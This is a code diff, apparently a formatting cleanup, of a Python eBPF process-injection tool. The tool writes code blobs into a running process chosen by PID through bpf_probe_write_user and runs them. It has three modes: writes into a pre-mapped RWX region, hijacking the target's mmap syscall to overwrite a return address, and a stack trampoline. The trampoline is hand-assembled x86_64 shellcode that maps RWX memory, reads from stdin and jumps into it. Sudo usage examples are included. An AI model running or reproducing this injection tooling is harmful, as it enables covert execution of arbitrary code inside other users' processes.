@@ -53,15 +53,13 @@ import ctypes
 import ctypes.util
 import math
 import os
-import struct
 import sys
-import time
 from pathlib import Path
 
 PROJECT_ROOT = Path(__file__).resolve().parent.parent
 sys.path.insert(0, str(PROJECT_ROOT / "python"))
 
-from picblobs import get_blob, BlobData
+from picblobs import BlobData, get_blob
 from picblobs._extractor import extract
 
 # ---------------------------------------------------------------------------
@@ -84,8 +82,10 @@ MAX_BLOB_SIZE = 65536
 # Technique 1: Kernel-context write via bpf_probe_write_user
 # ===========================================================================
 
-def gen_kwrite_bpf(blob_data: bytes, load_addr: int, target_pid: int,
-                   num_chunks: int) -> str:
+
+def gen_kwrite_bpf(
+    blob_data: bytes, load_addr: int, target_pid: int, num_chunks: int
+) -> str:
     """Generate BPF C source for kernel-context blob writing.
 
     The blob is stored in a BPF array map (one entry per chunk).
@@ -217,22 +217,26 @@ def mode_kwrite(args):
     num_chunks = math.ceil(len(payload) / BPF_WRITE_CHUNK)
     # Pad to full chunk boundary
     padded = payload.ljust(num_chunks * BPF_WRITE_CHUNK, b"\x00")
-    chunks = [padded[i:i+BPF_WRITE_CHUNK] for i in range(0, len(padded), BPF_WRITE_CHUNK)]
+    chunks = [
+        padded[i : i + BPF_WRITE_CHUNK] for i in range(0, len(padded), BPF_WRITE_CHUNK)
+    ]
 
-    print(f"\n[*] ══════ eBPF KERNEL-CONTEXT LOADER ══════")
-    print(f"[*] Technique: bpf_probe_write_user (NO ptrace)")
+    print("\n[*] ══════ eBPF KERNEL-CONTEXT LOADER ══════")
+    print("[*] Technique: bpf_probe_write_user (NO ptrace)")
     print(f"[*] Blob: {blob.blob_type}/{blob.target_os}/{blob.target_arch}")
-    print(f"[*] Payload: {len(payload)} bytes → {num_chunks} chunks of {BPF_WRITE_CHUNK}B")
+    print(
+        f"[*] Payload: {len(payload)} bytes → {num_chunks} chunks of {BPF_WRITE_CHUNK}B"
+    )
     print(f"[*] Load address: {load_addr:#018x}")
     print(f"[*] Target PID: {pid}")
     print(f"[*] Probe: {library}:{symbol}")
     print()
     print(f"[*] The target must have an RWX region mapped at {load_addr:#x}.")
-    print(f"[*] (Use the helper: prep_target.py, or mmap it manually)")
+    print("[*] (Use the helper: prep_target.py, or mmap it manually)")
     print()
-    print(f"[!] IMPORTANT: bpf_probe_write_user writes to the CURRENT task's")
-    print(f"[!] memory from kernel context. No ptrace attach, no SIGSTOP,")
-    print(f"[!] no /proc/pid/mem. The write happens inside the probe handler.")
+    print("[!] IMPORTANT: bpf_probe_write_user writes to the CURRENT task's")
+    print("[!] memory from kernel context. No ptrace attach, no SIGSTOP,")
+    print("[!] no /proc/pid/mem. The write happens inside the probe handler.")
     print()
 
     # Generate and load BPF program
@@ -263,13 +267,17 @@ def mode_kwrite(args):
         comm = event.comm.decode("utf-8", errors="replace")
 
         if stage == 0:
-            print(f"    [kernel] Chunk {event.chunks_done}/{num_chunks} written "
-                  f"→ {event.write_addr:#018x}  ({comm})")
+            print(
+                f"    [kernel] Chunk {event.chunks_done}/{num_chunks} written "
+                f"→ {event.write_addr:#018x}  ({comm})"
+            )
         elif stage == 1:
-            print(f"\n[+] [kernel] All chunks written. Return address overwritten.")
-            print(f"[+] [kernel] Target will jump to {event.write_addr:#018x} on "
-                  f"function return.")
-            print(f"[+] Injection complete — entirely from kernel context.")
+            print("\n[+] [kernel] All chunks written. Return address overwritten.")
+            print(
+                f"[+] [kernel] Target will jump to {event.write_addr:#018x} on "
+                f"function return."
+            )
+            print("[+] Injection complete — entirely from kernel context.")
             done = True
 
     b["events"].open_ring_buffer(handle_event)
@@ -436,19 +444,21 @@ def mode_hijack(args):
 
     num_chunks = math.ceil(len(payload) / BPF_WRITE_CHUNK)
     padded = payload.ljust(num_chunks * BPF_WRITE_CHUNK, b"\x00")
-    chunks = [padded[i:i+BPF_WRITE_CHUNK] for i in range(0, len(padded), BPF_WRITE_CHUNK)]
+    chunks = [
+        padded[i : i + BPF_WRITE_CHUNK] for i in range(0, len(padded), BPF_WRITE_CHUNK)
+    ]
 
-    print(f"\n[*] ══════ eBPF SYSCALL HIJACK LOADER ══════")
-    print(f"[*] Technique: intercept target's mmap + bpf_probe_write_user")
-    print(f"[*] Fully autonomous — no ptrace, no /proc, no cooperation")
+    print("\n[*] ══════ eBPF SYSCALL HIJACK LOADER ══════")
+    print("[*] Technique: intercept target's mmap + bpf_probe_write_user")
+    print("[*] Fully autonomous — no ptrace, no /proc, no cooperation")
     print(f"[*] Blob: {blob.blob_type}/{blob.target_os}/{blob.target_arch}")
     print(f"[*] Payload: {len(payload)} bytes → {num_chunks} chunks")
     print(f"[*] Target PID: {pid}")
     print()
-    print(f"[*] Phase 1: Wait for target to call mmap() for any reason")
-    print(f"[*] Phase 2: Capture returned address from kernel")
-    print(f"[*] Phase 3: Write blob chunks via bpf_probe_write_user")
-    print(f"[*] Phase 4: Overwrite return address → blob entry")
+    print("[*] Phase 1: Wait for target to call mmap() for any reason")
+    print("[*] Phase 2: Capture returned address from kernel")
+    print("[*] Phase 3: Write blob chunks via bpf_probe_write_user")
+    print("[*] Phase 4: Overwrite return address → blob entry")
     print()
 
     src = BPF_HIJACK_SRC
@@ -470,7 +480,7 @@ def mode_hijack(args):
     # Attach uprobe for the write-trigger phase
     lib_path = resolve_library(library)
     b.attach_uprobe(name=lib_path, sym=symbol, fn_name="on_write_trigger", pid=pid)
-    print(f"[+] Probes attached. Waiting for target activity...\n")
+    print("[+] Probes attached. Waiting for target activity...\n")
 
     done = False
 
@@ -478,18 +488,24 @@ def mode_hijack(args):
         nonlocal done
         event = b["events"].event(data)
         phase = event.phase
-        comm = event.comm.decode("utf-8", errors="replace")
+        event.comm.decode("utf-8", errors="replace")
 
         if phase == 1:
             print(f"[*] [kernel] Phase 1: Detected mmap syscall from PID {event.pid}")
         elif phase == 2 and event.detail == 0:
             print(f"[+] [kernel] Phase 2: Captured mmap return: {event.addr:#018x}")
         elif phase == 2 and event.detail > 0:
-            print(f"    [kernel] Phase 3: Chunk {event.detail}/{num_chunks} "
-                  f"→ {event.addr:#018x}")
+            print(
+                f"    [kernel] Phase 3: Chunk {event.detail}/{num_chunks} "
+                f"→ {event.addr:#018x}"
+            )
         elif phase == 3:
-            print(f"\n[+] [kernel] Phase 4: Return address overwritten → {event.addr:#018x}")
-            print(f"[+] Fully autonomous injection complete. Zero userspace involvement.")
+            print(
+                f"\n[+] [kernel] Phase 4: Return address overwritten → {event.addr:#018x}"
+            )
+            print(
+                "[+] Fully autonomous injection complete. Zero userspace involvement."
+            )
             done = True
 
     b["events"].open_ring_buffer(handle_event)
@@ -506,6 +522,7 @@ def mode_hijack(args):
 # ===========================================================================
 # Technique 3: Stack trampoline (requires -z execstack)
 # ===========================================================================
+
 
 def gen_smash_bpf(trampoline: bytes, target_pid: int) -> str:
     """Generate BPF source for stack trampoline injection.
@@ -574,28 +591,80 @@ int on_uprobe_hit(struct pt_regs *ctx) {{
 # x86_64 trampoline: mmap RWX region, read blob from stdin, jump to it
 # This is a minimal PIC stub that the stack-smash technique writes to the stack.
 # It then bootstraps the full blob load.
-TRAMPOLINE_X86_64 = bytes([
-    # mmap(NULL, 0x10000, PROT_RWX, MAP_PRIVATE|MAP_ANON, -1, 0)
-    0x48, 0x31, 0xff,                   # xor rdi, rdi        ; addr = NULL
-    0x48, 0xc7, 0xc6, 0x00, 0x00, 0x01, 0x00,  # mov rsi, 0x10000    ; len = 64KB
-    0x48, 0xc7, 0xc2, 0x07, 0x00, 0x00, 0x00,  # mov rdx, 7          ; PROT_RWX
-    0x49, 0xc7, 0xc2, 0x22, 0x00, 0x00, 0x00,  # mov r10, 0x22       ; MAP_PRIVATE|MAP_ANON
-    0x49, 0x83, 0xc8, 0xff,             # or  r8, -1          ; fd = -1
-    0x4d, 0x31, 0xc9,                   # xor r9, r9          ; offset = 0
-    0x48, 0xc7, 0xc0, 0x09, 0x00, 0x00, 0x00,  # mov rax, 9          ; __NR_mmap
-    0x0f, 0x05,                         # syscall
-    # rax = mmap'd address
-    0x48, 0x89, 0xc7,                   # mov rdi, rax        ; save addr
-    0x48, 0x89, 0xc3,                   # mov rbx, rax        ; save for jump
-    # read(0, mmap_addr, 0x10000)
-    0x48, 0x89, 0xfe,                   # mov rsi, rdi        ; buf = mmap addr
-    0x48, 0x31, 0xff,                   # xor rdi, rdi        ; fd = 0 (stdin)
-    0x48, 0xc7, 0xc2, 0x00, 0x00, 0x01, 0x00,  # mov rdx, 0x10000    ; count
-    0x48, 0x31, 0xc0,                   # xor rax, rax        ; __NR_read = 0
-    0x0f, 0x05,                         # syscall
-    # jump to mmap'd blob
-    0xff, 0xe3,                         # jmp rbx
-])
+TRAMPOLINE_X86_64 = bytes(
+    [
+        # mmap(NULL, 0x10000, PROT_RWX, MAP_PRIVATE|MAP_ANON, -1, 0)
+        0x48,
+        0x31,
+        0xFF,  # xor rdi, rdi        ; addr = NULL
+        0x48,
+        0xC7,
+        0xC6,
+        0x00,
+        0x00,
+        0x01,
+        0x00,  # mov rsi, 0x10000    ; len = 64KB
+        0x48,
+        0xC7,
+        0xC2,
+        0x07,
+        0x00,
+        0x00,
+        0x00,  # mov rdx, 7          ; PROT_RWX
+        0x49,
+        0xC7,
+        0xC2,
+        0x22,
+        0x00,
+        0x00,
+        0x00,  # mov r10, 0x22       ; MAP_PRIVATE|MAP_ANON
+        0x49,
+        0x83,
+        0xC8,
+        0xFF,  # or  r8, -1          ; fd = -1
+        0x4D,
+        0x31,
+        0xC9,  # xor r9, r9          ; offset = 0
+        0x48,
+        0xC7,
+        0xC0,
+        0x09,
+        0x00,
+        0x00,
+        0x00,  # mov rax, 9          ; __NR_mmap
+        0x0F,
+        0x05,  # syscall
+        # rax = mmap'd address
+        0x48,
+        0x89,
+        0xC7,  # mov rdi, rax        ; save addr
+        0x48,
+        0x89,
+        0xC3,  # mov rbx, rax        ; save for jump
+        # read(0, mmap_addr, 0x10000)
+        0x48,
+        0x89,
+        0xFE,  # mov rsi, rdi        ; buf = mmap addr
+        0x48,
+        0x31,
+        0xFF,  # xor rdi, rdi        ; fd = 0 (stdin)
+        0x48,
+        0xC7,
+        0xC2,
+        0x00,
+        0x00,
+        0x01,
+        0x00,  # mov rdx, 0x10000    ; count
+        0x48,
+        0x31,
+        0xC0,  # xor rax, rax        ; __NR_read = 0
+        0x0F,
+        0x05,  # syscall
+        # jump to mmap'd blob
+        0xFF,
+        0xE3,  # jmp rbx
+    ]
+)
 
 
 def mode_smash(args):
@@ -610,18 +679,18 @@ def mode_smash(args):
     symbol = args.symbol or "write"
     library = args.library or "c"
 
-    blob, config = load_blob(args)
+    blob, _config = load_blob(args)
 
-    print(f"\n[*] ══════ eBPF STACK TRAMPOLINE LOADER ══════")
-    print(f"[*] Technique: bpf_probe_write_user → stack (requires execstack)")
+    print("\n[*] ══════ eBPF STACK TRAMPOLINE LOADER ══════")
+    print("[*] Technique: bpf_probe_write_user → stack (requires execstack)")
     print(f"[*] Blob: {blob.blob_type}/{blob.target_os}/{blob.target_arch}")
     print(f"[*] Trampoline: {len(TRAMPOLINE_X86_64)} bytes (mmap+read+jmp stub)")
     print(f"[*] Target PID: {pid}")
     print(f"[*] Probe: {library}:{symbol}")
     print()
-    print(f"[!] NOTE: Target must have executable stack (-z execstack)")
-    print(f"[!] The trampoline will mmap RWX, read blob from stdin, and jump.")
-    print(f"[!] Pipe the blob to the target's stdin to complete injection.")
+    print("[!] NOTE: Target must have executable stack (-z execstack)")
+    print("[!] The trampoline will mmap RWX, read blob from stdin, and jump.")
+    print("[!] Pipe the blob to the target's stdin to complete injection.")
     print()
 
     src = gen_smash_bpf(TRAMPOLINE_X86_64, pid)
@@ -636,14 +705,14 @@ def mode_smash(args):
     def handle_event(ctx, data, size):
         nonlocal done
         event = b["events"].event(data)
-        print(f"[+] [kernel] Stack trampoline written!")
+        print("[+] [kernel] Stack trampoline written!")
         print(f"    PID: {event.pid}")
         print(f"    RSP: {event.rsp:#018x}")
         print(f"    Trampoline at: {event.tramp_addr:#018x}")
         print(f"    Process: {event.comm.decode('utf-8', errors='replace')}")
         print()
         print(f"[*] When {symbol}() returns, execution will hit the trampoline.")
-        print(f"[*] The trampoline will mmap RWX + read blob from fd 0 + jump.")
+        print("[*] The trampoline will mmap RWX + read blob from fd 0 + jump.")
         done = True
 
     b["events"].open_ring_buffer(handle_event)
@@ -661,12 +730,17 @@ def mode_smash(args):
 # Shared helpers
 # ===========================================================================
 
+
 def load_blob(args) -> tuple[BlobData, bytes]:
     """Load blob from package or .so path."""
     config = bytes.fromhex(args.config_hex) if args.config_hex else b""
     if args.so:
-        blob = extract(args.so, blob_type=args.blob_type,
-                       target_os=args.blob_os, target_arch=args.blob_arch)
+        blob = extract(
+            args.so,
+            blob_type=args.blob_type,
+            target_os=args.blob_os,
+            target_arch=args.blob_arch,
+        )
     else:
         blob = get_blob(args.blob_type, args.blob_os, args.blob_arch)
     print(f"[*] Blob: {len(blob.code)} bytes, SHA-256: {blob.sha256[:16]}...")
@@ -678,7 +752,7 @@ def prepare_payload(blob: BlobData, config: bytes) -> bytes:
     payload = bytearray(blob.code)
     if config:
         offset = blob.config_offset
-        payload[offset:offset + len(config)] = config
+        payload[offset : offset + len(config)] = config
     return bytes(payload)
 
 
@@ -687,6 +761,7 @@ def resolve_library(library: str) -> str:
     if "/" in library:
         return library
     import subprocess
+
     lib = ctypes.util.find_library(library)
     if lib:
         result = subprocess.run(["ldconfig", "-p"], capture_output=True, text=True)
@@ -721,31 +796,37 @@ Examples:
   sudo python3 mbed/ebpf_kernel_loader.py kwrite --pid 1234
   sudo python3 mbed/ebpf_kernel_loader.py hijack --pid 1234 --symbol printf
   sudo python3 mbed/ebpf_kernel_loader.py smash  --pid 1234 --symbol read
-        """)
+        """,
+    )
 
     subs = parser.add_subparsers(dest="technique", required=True)
 
     # Technique 1: kwrite
-    p1 = subs.add_parser("kwrite",
-        help="Kernel-context write into pre-arranged RWX region")
+    p1 = subs.add_parser(
+        "kwrite", help="Kernel-context write into pre-arranged RWX region"
+    )
     p1.add_argument("--pid", type=int, required=True)
     p1.add_argument("--symbol", default="write")
     p1.add_argument("--library", default="c")
-    p1.add_argument("--load-addr", default=None,
-                    help="Hex load address (default: 0x7F00000000)")
+    p1.add_argument(
+        "--load-addr", default=None, help="Hex load address (default: 0x7F00000000)"
+    )
     add_blob_args(p1)
 
     # Technique 2: hijack
-    p2 = subs.add_parser("hijack",
-        help="Intercept mmap syscall + kernel-context write (fully autonomous)")
+    p2 = subs.add_parser(
+        "hijack",
+        help="Intercept mmap syscall + kernel-context write (fully autonomous)",
+    )
     p2.add_argument("--pid", type=int, required=True)
     p2.add_argument("--symbol", default="write")
     p2.add_argument("--library", default="c")
     add_blob_args(p2)
 
     # Technique 3: smash
-    p3 = subs.add_parser("smash",
-        help="Stack trampoline via bpf_probe_write_user (needs execstack)")
+    p3 = subs.add_parser(
+        "smash", help="Stack trampoline via bpf_probe_write_user (needs execstack)"
+    )
     p3.add_argument("--pid", type=int, required=True)
     p3.add_argument("--symbol", default="write")
     p3.add_argument("--library", default="c")
